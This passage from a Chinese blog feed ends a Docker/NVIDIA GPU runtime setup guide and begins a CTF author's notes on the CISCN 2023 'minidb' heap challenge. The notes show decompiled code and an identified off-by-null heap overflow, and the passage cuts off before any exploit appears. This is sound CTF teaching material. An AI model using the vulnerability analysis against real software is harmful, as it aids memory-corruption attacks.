命令一样的结果就说明安装成功了：</p><p><img src="https://s2.loli.net/2023/08/31/6BVStUv9jeCuimM.png" alt="image.png"></p><h4 id="方法-②"><a href="#方法-②" class="headerlink" title="方法 ②"></a>方法 ②</h4><blockquote><p>参见 <a href="https://github.com/NVIDIA/nvidia-docker/issues/1238">Github 上的这个 issue</a></p></blockquote><p>若方法 ① 没法成功进行，可以使用如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/<span class="hljs-variable">$distribution</span>/nvidia-docker.list | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-docker.list</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h2 id="添加-NVIDIA-Rumtime"><a href="#添加-NVIDIA-Rumtime" class="headerlink" title="添加 NVIDIA Rumtime"></a>添加 NVIDIA Rumtime</h2><p>NVIDIA Container Runtime 的添加一共有三种方法</p><h4 id="方法-①-1"><a href="#方法-①-1" class="headerlink" title="方法 ①"></a>方法 ①</h4><p>首先创建配置文件夹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></code></pre></td></tr></table></figure><p>然后创建配置文件，注意这条命令一共有五行，全部复制后粘贴进去：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">tee</span> /etc/systemd/system/docker.service.d/override.conf &lt;&lt;<span class="hljs-string">EOF</span></span><br>[Service]<br>ExecStart=<br>ExecStart=/usr/bin/dockerd --host=fd:// --add-runtime=nvidia=/usr/bin/nvidia-container-runtime<br>EOF<br></code></pre></td></tr></table></figure><p>重启 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="方法-②-1"><a href="#方法-②-1" class="headerlink" title="方法 ②"></a>方法 ②</h4><p>Nvidia toolkit 安装成功之后也可以辅助我们完成这一步，通过如下两条命令其中之一完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker --set-as-default <span class="hljs-comment"># 设置为默认</span></span><br></code></pre></td></tr></table></figure><p>重启 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="方法-③"><a href="#方法-③" class="headerlink" title="方法 ③"></a>方法 ③</h4><p>也可以使用 docker 直接添加 NVIDIA Runtime：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dockerd --add-runtime=nvidia=/usr/bin/nvidia-container-runtime [...]</span><br></code></pre></td></tr></table></figure><h2 id="配置带-CUDA-的-docker-镜像"><a href="#配置带-CUDA-的-docker-镜像" class="headerlink" title="配置带 CUDA 的 docker 镜像"></a>配置带 CUDA 的 docker 镜像</h2><h2 id="创建并启动带显卡的-Docker-容器"><a href="#创建并启动带显卡的-Docker-容器" class="headerlink" title="创建并启动带显卡的 Docker 容器"></a>创建并启动带显卡的 Docker 容器</h2><p>与 <code>0x01</code> 中的创建 docker 容器的步骤基本相同，不过需要添加额外的参数</p><blockquote><p>更多用法参见 <a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.html%EF%BC%8C%E6%9C%AC%E6%96%87%E4%BB%85%E5%B1%95%E7%A4%BA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.html，本文仅展示基本用法</a></p></blockquote><h3 id="使用-Nvidia-Runtime"><a href="#使用-Nvidia-Runtime" class="headerlink" title="使用 Nvidia Runtime"></a>使用 Nvidia Runtime</h3><ul><li>容器内挂载所有的显卡</li></ul><p>通过额外添加 <code>--runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all</code> 参数完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all 自定义镜像名</span><br></code></pre></td></tr></table></figure><ul><li>容器内挂载指定显卡</li></ul><p>通过额外添加 <code>--runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=显卡标号</code> 参数完成，其中显卡标号为 <code>nvidia-smi -L</code> 命令中所展示的序号，挂载多张显卡需要用 <code>,</code> 进行隔离（<strong>显卡标号间不要加空格</strong> ），这里以挂载第一、二张显卡为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=0,1 自定义镜像名</span><br></code></pre></td></tr></table></figure><h3 id="传统用法"><a href="#传统用法" class="headerlink" title="传统用法"></a>传统用法</h3><ul><li>容器内挂载所有的显卡</li></ul><p>额外添加 <code>--gpus all</code> 参数即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --gpus all 自定义镜像名</span><br></code></pre></td></tr></table></figure><ul><li>容器内挂载指定显卡</li></ul><p>通过额外添加 <code>--gpus=&#39;&quot;device=显卡标号&quot;&#39;</code> 参数完成，其中显卡标号为 <code>nvidia-smi -L</code> 命令中所展示的序号，以下命令以第一张显卡为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --gpus=<span class="hljs-string">&#x27;&quot;device=0&quot;&#x27;</span> 自定义镜像名</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;怎么实验室只有👴一个运维&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x09】CISCN 2023 华东北分区赛 minidb、kkk 出题手记</title>
    <link href="https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/"/>
    <id>https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/</id>
    <published>2023-07-13T23:43:35.000Z</published>
    <updated>2023-09-26T17:42:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>典中典之低质量套路 Pwn 题集合</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>第一次帮国赛出题（<del>主要是听说有💴恰</del>），不出意外的话应该也是本科阶段最后一次出 CTF Pwn 题目了，同时这也是笔者第一次出 AWDP 的题目，感觉还是有点意思的 ：）</p><p>因为短时间内确实是想不出什么新东西了所以出了两道比较套路化的题目，可惜解题率似乎有点不尽人意，估计大佬们应该都不屑于做笔者出的烂题吧 :（</p><h1 id="0x01-minidb（简单）"><a href="#0x01-minidb（简单）" class="headerlink" title="0x01. minidb（简单）"></a>0x01. minidb（简单）</h1><p>这道题出题时的难度设置便是 <code>简单</code> ，所以笔者是按照签到题的难度去出的，不过虽然成功 <code>fix</code> 的队伍不少，但是成功 <code>break</code> 的队伍似乎并如预期不多🤔（<del>修都修了打还不会打🐎，你们是不是偷偷藏了什么👴不知道的通防手段</del>）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先还是惯例修个跳表：</p><p><img src="https://s2.loli.net/2023/07/07/VpuMXz3L9vFgiRC.png" alt="IDA 修复跳表.png"></p><p>提供了两层堆菜单，第一层可以让用户创建、使用、删除、展示、重命名数据库：</p><p><img src="https://s2.loli.net/2023/07/12/tbZT75vorwOKMnj.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1547</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_139F();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    v2 = v1;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">5</span> )<br>    &#123;<br>LABEL_6:<br>      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>        <span class="hljs-keyword">continue</span>;<br>LABEL_15:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">5</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    <span class="hljs-keyword">switch</span> ( v2 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_15;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        sub_1D38();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = sub_2080();<br>        <span class="hljs-keyword">if</span> ( v3 )<br>          sub_1451(v3);<br>        v3 = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        sub_21C1();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        sub_23EA();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        sub_247F();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_6;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v2 != <span class="hljs-number">666</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;See you next time~&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中数据库的创建会分配两个 chunk，一个用作数据库本体，另一个用作数据库的名字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1D38</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-12Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+8h] [rbp-128h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-124h]</span><br>  <span class="hljs-type">void</span> **v5; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !dword_6088 )<br>    dword_6088 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( dword_608C &lt;= <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !qword_6060[i] )<br>      &#123;<br>        v5 = (<span class="hljs-type">void</span> **)&amp;qword_6060[i];<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    ptr = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, <span class="hljs-number">0x810</span>uLL);<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the name of database: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s2);<br>      <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">4</span>; ++j )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( qword_6060[j] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(qword_6060[j] + <span class="hljs-number">8LL</span>), s2) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] There&#x27;s already another database with the same name!\x1B[0m&quot;</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>      &#125;<br>      v4 = <span class="hljs-built_in">strlen</span>(s2);<br>      *((_QWORD *)ptr + <span class="hljs-number">1</span>) = <span class="hljs-built_in">malloc</span>(v4 + <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> ( *((_QWORD *)ptr + <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>(*((<span class="hljs-type">char</span> **)ptr + <span class="hljs-number">1</span>), s2);<br>        *(_BYTE *)(*((_QWORD *)ptr + <span class="hljs-number">1</span>) + v4) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now you can set the type of your databse. Here&#x27;s available choices:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. int32 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. int64 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. int32 to str[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. int64 to strr[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(Note that the string should end with a &#x27;\\0&#x27;, so the max length of input is 127/255)&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the type of database: &quot;</span>);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>        <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">4</span> &amp;&amp; v1 )<br>        &#123;<br>          *(_DWORD *)ptr = v1;<br>          *v5 = ptr;<br>          ++dword_608C;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Succesfully create a new database with name \&quot;%s\&quot;!\n&quot;</span>, s2);<br>          <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid type of database!\x1B[0m&quot;</span>);<br>        <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr + <span class="hljs-number">1</span>));<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db name!\x1B[0m&quot;</span>);<br>      &#125;<br>LABEL_24:<br>      <span class="hljs-built_in">free</span>(ptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db!\x1B[0m&quot;</span>);<br>    &#125;<br>    *v5 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] You&#x27;ve already got too many databases!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二层堆菜单则提供了对数据库内键值对数据的增加、查询、更新、删除操作：</p><p><img src="https://s2.loli.net/2023/07/12/yEmj24xGUVwt7Os.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1451</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_13FE();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    v3 = v2;<br>    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">666</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        sub_1C47(a1);<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-keyword">switch</span> ( v3 )<br>        &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            sub_1A81(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            sub_1712(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            sub_19BD(a1);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 != <span class="hljs-number">666</span> );<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中判断是否存在重复键的逻辑如下，可以看出数据储存方式是哈希表 + 单向链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">sub_168D</span><span class="hljs-params">(__int64 a1, __int64 a2, _QWORD *a3)</span><br>&#123;<br>  _QWORD *v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  _QWORD *v5; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v4 = *(_QWORD **)(a1 + <span class="hljs-number">8</span> * ((<span class="hljs-type">unsigned</span> __int8)a2 + <span class="hljs-number">2LL</span>)); <span class="hljs-comment">/* hash to %256 */</span><br>  v5 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a2 == v4[<span class="hljs-number">1</span>] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( a3 )<br>        *a3 = v5;<br>      <span class="hljs-keyword">return</span> v4;<br>    &#125;<br>    v5 = v4;<br>    v4 = (_QWORD *)*v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>由此我们可以逆向出数据库与键值对的结构体定义分别如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">int64_t</span> key;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0</span>]; <span class="hljs-comment">/* 128 or 256 here */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">database</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> type;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">kv</span>[256];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>漏洞点在于编辑键值对的功能中，这里在读取用户输入后会先在键值对末尾放置 <code>&#39;\0&#39;</code> 后再检查长度，虽然限制了最大输入长度为 255 字符，但键值对的值长度有 <code>128</code> 和 <code>256</code> 两种类型，<strong>对于前者而言我们可以利用该漏洞完成一个堆上越界写 \0</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 